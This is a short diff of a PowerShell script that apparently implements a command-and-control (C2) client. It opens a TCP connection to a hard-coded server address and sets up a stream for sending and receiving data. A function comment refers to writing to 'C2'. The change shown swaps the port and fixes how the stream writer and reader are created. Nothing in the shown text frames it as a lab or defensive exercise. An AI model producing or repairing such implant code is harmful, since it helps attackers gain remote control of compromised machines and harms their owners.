@@ -1,6 +1,6 @@
 # Define the server's IP address and port
 $SERVER_HOST = "192.168.56.105"  # Replace with the server's IP address
-$SERVER_PORT = 9997
+$SERVER_PORT = 9996
 
 # Create a TCP client object
 $tcpClient = New-Object System.Net.Sockets.TcpClient
@@ -10,8 +10,8 @@ $tcpClient.Connect($SERVER_HOST, $SERVER_PORT)
 
 # Create a stream object for sending and receiving data
 $stream = $tcpClient.GetStream()
-$writer = New-Object System.IO.writer($stream)
-$reader = New-Object System.IO.StreamReader($stream)
+$writer = [System.IO.StreamWriter]::new($stream)
+$reader = [System.IO.StreamReader]::new($stream)
 
 # Writes a string to C2
 function WriteToStream ($String) {
